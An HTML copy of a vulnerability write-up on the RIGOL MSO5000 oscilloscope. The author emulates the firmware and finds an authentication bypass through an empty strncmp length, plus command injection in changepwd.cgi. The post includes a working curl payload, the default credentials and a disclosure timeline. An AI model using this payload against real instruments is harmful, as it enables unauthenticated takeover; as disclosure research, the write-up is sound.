<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://tortel.li/post/insecure-scope/">Original</a>
    <h1>Unauthenticated RCE on a RIGOL oscilloscope</h1>
    
    <div id="readability-page-1" class="page"><section><p>I work in a company that uses custom electronic boards, so there are plenty of instruments floating around that electrical engineers employ to debug faulty connections and solderings.</p>
<p>One kind of tools used are the oscilloscopes, tools that measure signals and plot them in a graphically understandable way. We have a bunch of them, yet only one model in particular caught my attention, because it has a web interface!</p>
<p><img src="https://tortel.li/rigol_web_control.png" alt=""/></p>
<p>I was super curious so I decided to try and (digitally) crack it open. I headed to the <a href="https://www.rigolna.com/firmware/">vendor firmware downloads page</a>, selected the MSO5000 firmware and waited for my browser to complete the download.</p>
<p>The downloaded file ends in .GEL, and I have never seen that extension before. <code>file</code> thinks it’s a tar archive, so let’s try to use <code>binwalk -e</code> and extract what’s inside.</p>
<div><pre tabindex="0"><code data-lang="plaintext"><span><span>$ tree --charset=ascii .
</span></span><span><span>.
</span></span><span><span>`-- _DS5000Update.GEL.extracted
</span></span><span><span>    |-- 0.tar
</span></span><span><span>    |-- app.img.gz
</span></span><span><span>    |-- fw4linux.sh
</span></span><span><span>    |-- fw4uboot.sh
</span></span><span><span>    |-- logo.hex.gz
</span></span><span><span>    |-- system.img.gz
</span></span><span><span>    `-- zynq.bit.gz
</span></span><span><span>
</span></span><span><span>1 directory, 7 files
</span></span></code></pre></div><p>The <code>app.img.gz</code> looked intersting and after extraction, in fact turned out containing the binaries for the web control application.</p>
<p>After extracting the <code>app.img.gz</code> with <code>p7zip</code>, I used <code>binwalk -e</code> again (it actually asked to install <a href="https://github.com/jrspruitt/ubi_reader">this tool</a> before allowing me to extract the files) and this was the resulting folder.</p>
<div><pre tabindex="0"><code data-lang="plaintext"><span><span>$ tree --charset=ascii -L 2 .
</span></span><span><span>.
</span></span><span><span>`-- app
</span></span><span><span>    |-- appEntry
</span></span><span><span>    |-- cups
</span></span><span><span>    |-- default
</span></span><span><span>    |-- drivers
</span></span><span><span>    |-- K160M_TOP.bit
</span></span><span><span>    |-- mail
</span></span><span><span>    |-- Qt5.5
</span></span><span><span>    |-- resource
</span></span><span><span>    |-- shell
</span></span><span><span>    |-- tools
</span></span><span><span>    `-- webcontrol
</span></span><span><span>
</span></span><span><span>10 directories, 2 files
</span></span></code></pre></div><p>Hooray! The <code>webcontrol</code> folder looks promising. And in fact here there are all the files needed in order to launch the webcontrol application.</p>
<h2 id="lets-try-to-emulate-it">Let’s try to emulate it!</h2>
<p>We will use <code>qemu</code> and <code>chroot</code> in combination in order to emulate the oscilloscope software without having to brick a real oscilloscope.</p>
<p>But before tinkering with <code>qemu</code>, we need to have an exact copy of the internal memory of the oscilloscope, in order to have all the correct libraries installed.</p>
<p>Extract the <code>system.img</code> file we found before with <code>binwalk -e</code>. It will contain a file named <code>rootfs.img</code>, which is an ext2 image.</p>
<p>Mount and copy the rootfs image with <code>mkdir mount &amp;&amp; sudo mount rootfs.img mount/ &amp;&amp; cp -r mount rootfs &amp;&amp; sudo umount mount</code>. This should be the result.</p>
<div><pre tabindex="0"><code data-lang="plaintext"><span><span>$ tree -L 1 --charset=ascii
</span></span><span><span>.
</span></span><span><span>|-- bin
</span></span><span><span>|-- checkapp
</span></span><span><span>|-- dev
</span></span><span><span>|-- etc
</span></span><span><span>|-- home
</span></span><span><span>|-- lib
</span></span><span><span>|-- licenses
</span></span><span><span>|-- linuxrc -&gt; bin/busybox
</span></span><span><span>|-- lost+found
</span></span><span><span>|-- media
</span></span><span><span>|-- mnt
</span></span><span><span>|-- opt
</span></span><span><span>|-- proc
</span></span><span><span>|-- rigol
</span></span><span><span>|-- root
</span></span><span><span>|-- sbin
</span></span><span><span>|-- sys
</span></span><span><span>|-- tmp
</span></span><span><span>|-- ubifs-util
</span></span><span><span>|-- user
</span></span><span><span>|-- usr
</span></span><span><span>`-- var
</span></span><span><span>
</span></span><span><span>20 directories, 2 files
</span></span></code></pre></div><p>Now, let’s try to emulate something with <code>qemu</code>, like a shell.</p>
<p>Make sure to install <code>qemu qemu-user-static binfmt-support</code>. If you’re using Ubuntu: <code>sudo apt install qemu qemu-user-static binfmt-support</code>.</p>
<p>Then copy <code>qemu-arm-static</code> to a place inside the rootfs, so when we <code>chroot</code> into the folder, it will be found.</p>
<div><pre tabindex="0"><code data-lang="bash"><span><span>sudo cp /usr/bin/qemu-arm-static ./rootfs/bin
</span></span></code></pre></div><p>Then use <code>sudo chroot . sh</code> to emulate a shell.</p>
<div><pre tabindex="0"><code data-lang="plaintext"><span><span>~/rootfs 
</span></span><span><span>$ sudo chroot . sh
</span></span><span><span>/ # ls
</span></span><span><span>bin         home        lost+found  proc        sys         usr
</span></span><span><span>checkapp    lib         media       rigol       tmp         var
</span></span><span><span>dev         licenses    mnt         root        ubifs-util
</span></span><span><span>etc         linuxrc     opt         sbin        user
</span></span><span><span>/ # whoami
</span></span><span><span>root
</span></span><span><span>/ # uname -a
</span></span><span><span>Linux pwnOS 5.15.0-58-generic #64-Ubuntu SMP Thu Jan 5 11:43:13 UTC 2023 armv7l GNU/Linux
</span></span><span><span>/ # 
</span></span></code></pre></div><p>Perfect, we have a functioning rootfs. Let’s try to execute some RIGOL software. Copy the <code>/webcontrol</code> folder we found in the <code>app.img</code> file into <code>rootfs/rigol</code>, don’t copy it to the rootfs root, otherwise ld.so complains for some reason.</p>
<div><pre tabindex="0"><code data-lang="bash"><span><span>sudo cp -r ~/Downloads/osc/app/webcontrol ./rootfs/rigol
</span></span></code></pre></div><p>If we looked inside the <code>app.img</code> dump, we would have found a file named <code>app/shell/start.sh</code> that is responsible to launch the main components of the oscilloscope. In that file, we can see the part that launches the web control application.</p>
<div><pre tabindex="0"><code data-lang="plaintext"><span><span>############################################
</span></span><span><span>#Start webcontrol service
</span></span><span><span>############################################
</span></span><span><span>DATA_FILE=/rigol/data/user.conf
</span></span><span><span>if [ ! -f $DATA_FILE ]; then
</span></span><span><span>	cp /rigol/default/user.conf /rigol/data/
</span></span><span><span>	sync
</span></span><span><span>fi
</span></span><span><span>/rigol/webcontrol/sbin/lighttpd -f /rigol/webcontrol/config/lighttpd.conf &amp;
</span></span></code></pre></div><p><em>By default, the file <code>/rigol/default/user.conf</code> contains only
<code>admin:rigol</code> (which are the default credentials of the web application).Let’s create a new file <code>/rigol/webcontrol/config/user.conf</code> with <code>admin:rigol</code></em></p>
<p>Let’s try to launch the webcontrol!</p>
<div><pre tabindex="0"><code data-lang="bash"><span><span><span># Let&#39;s use -D to avoid letting the server go in the background.</span>
</span></span><span><span>sudo chroot . /rigol/webcontrol/sbin/lighttpd -D -f /rigol/webcontrol/config/lighttpd.conf
</span></span></code></pre></div><p><img src="https://tortel.li/rigol_web_control_emulated.png" alt="The emulated web server, we did it!"/></p>
<p>We did it! Since we now have a functioning RIGOL web control application, let’s start to look for bugs.</p>
<p>While I could have started anywhere, I was intrigued by the <code>cgi-bin</code> folder. I fired up my Ghidra instance and I loaded every <code>cgi-bin</code> entry into it.</p>
<p>After a bit of unsuccessful fiddling and checking for buffer uses (I was aiming for a memory corruption vulnerability), I found some strange stuff on <code>changepwd.cgi</code>.</p>
<p>Let’s load it on Ghidra.</p>
<h2 id="the-vulnerability">The vulnerability</h2>
<p>This binary gets executed every time the user wants to change their password.</p>
<p>First of all we need to find the <code>main</code> function. Luckily, symbols are left intact in this, so we don’t have to guess too much. The main function is a little bit strange: turns out that this binary uses <a href="https://github.com/boutell/cgic">this library</a> to handle CGI programming in C.</p>
<p>As the project’s <code>README</code> <a href="https://github.com/boutell/cgic#how-to-write-a-cgic-application">says</a>, the developer’s custom code starts in the function <code>cgiMain()</code>. Let’s find it.</p>
<p><img src="https://tortel.li/changepwd-bin.png" alt="The disassembly"/></p>
<p>The call to <code>system</code> looks super suspicious. The author basically wanted a quick way to write <code>admin:user_password</code> inside the <code>path</code> file (<code>/rigol/data/user.conf</code>). It does this by launching a shell and executing <code>echo admin:user_password &gt; /rigol/data/user.conf</code>.</p>
<div><pre tabindex="0"><code data-lang="c"><span><span>n <span>=</span> strlen(pass0);
</span></span><span><span>iVar2 <span>=</span> strncmp(saved_pwd,pass0,n);
</span></span><span><span><span>if</span> (iVar2 <span>==</span> <span>0</span>) {
</span></span><span><span>    sprintf(<span>&amp;</span>CMD_BUF,<span>&#34;echo admin:%s &gt; %s&#34;</span>,pass1,path);
</span></span><span><span>    system(<span>&amp;</span>CMD_BUF);
</span></span><span><span>    system(<span>&#34;sync&#34;</span>);
</span></span><span><span>    puts(<span>&#34;OK&#34;</span>);
</span></span><span><span>}
</span></span><span><span><span>else</span> {
</span></span><span><span>    puts(<span>&#34;Old password is wrong&#34;</span>);
</span></span><span><span>}
</span></span></code></pre></div><p>If an attacker passing something like <code>; whoami # </code> as <code>pass1</code>, they could execute arbitrary commands on the underlying system.</p>
<p>But, in order to reach that command injection vulnerability we need to pass the <code>strncmp</code> check that checks <code>pass0</code> against the saved password.</p>
<p>As per the manual, the <code>int strncmp(const char s1, const char s2, size_t n)</code> function compares the first <code>n</code> characters of the two strings. It is a little less known that if <code>n</code> is 0, the result of the <code>strncmp</code> function is also 0.</p>
<p>Can we force <code>n</code> to be 0?</p>
<p>Yes, if we manage to control <code>pass0</code>. If we passed an empty <code>pass0</code>, the <code>strlen</code> function would return 0 and that 0 would get passed as the <code>n</code> parameter to the <code>strncmp</code> function, letting us bypass the check!</p>
<p>So, we need to check whether we actually control <code>pass0</code> and <code>pass1</code>. If we scroll up a little bit we find these two assignments.</p>
<div><pre tabindex="0"><code data-lang="c"><span><span>pcVar1 <span>=</span> (<span>char</span> <span>*</span>)read_item_value(<span>&#34;pass0&#34;</span>,<span>256</span>);
</span></span><span><span>strcpy(pass0,pcVar1);
</span></span><span><span>pcVar1 <span>=</span> (<span>char</span> <span>*</span>)read_item_value(<span>&#34;pass1&#34;</span>,<span>256</span>);
</span></span><span><span>strcpy(pass1,pcVar1);
</span></span></code></pre></div><p><code>read_item_value</code> is basically a wrapper around <a href="https://github.com/boutell/cgic#cgiFormString"><code>cgiFormString</code></a>. If we provide the <code>pass0</code> and <code>pass1</code> form values in our HTTP request, we’re set.</p>
<div><pre tabindex="0"><code data-lang="c"><span><span><span>char</span><span>*</span> <span>read_item_value</span>(<span>char</span><span>*</span> param,<span>int</span> size) {
</span></span><span><span>  <span>// cmd_str is a global allocated buffer.
</span></span></span><span><span><span></span>  memset(cmd_str,<span>0</span>,<span>0x100</span>);
</span></span><span><span>  cgiFormString(param,cmd_str,size);
</span></span><span><span>  <span>return</span> cmd_str;
</span></span><span><span>}
</span></span></code></pre></div><h2 id="the-exploit">The exploit</h2>
<p>So, in the end, we control everything! A simple <code>curl</code> command is enough to hack an RIGOL oscilloscope through the RIGOL Web Control, without being authenticated at all.</p>
<div><pre tabindex="0"><code data-lang="bash"><span><span>curl http://localhost/cgi-bin/changepwd.cgi -d <span>&#34;pass0=&#34;</span> -d <span>&#34;pass1=; whoami; id; uname -a # &#34;</span>
</span></span></code></pre></div><p><img src="https://tortel.li/exploit.png" alt="pwned"/></p>
<h2 id="timeline">Timeline</h2>
<ul>
<li>Vulnerability found, 11/8/22</li>
<li>Sent detailed PoC, 11/9/22</li>
<li>RIGOL says they would have contacted me with updates from R&amp;D, 11/9/22</li>
<li>Follow-up on the vulnerability, 1/25/23</li>
<li>RIGOL says they would reply in 2-3 days, 1/28/23</li>
<li>Full disclosure, 2/8/23</li>
</ul>
<h2 id="conclusion">Conclusion</h2>
<p>Do not expose your RIGOL oscilloscopes to the internet.</p>
<h2 id="trivia">Trivia</h2>
<p>I also made <a href="https://github.com/havce/havceCTF/tree/master/scope">a CTF challenge</a> based on this vulnerability.</p>
</section></div>
  </body>
</html>
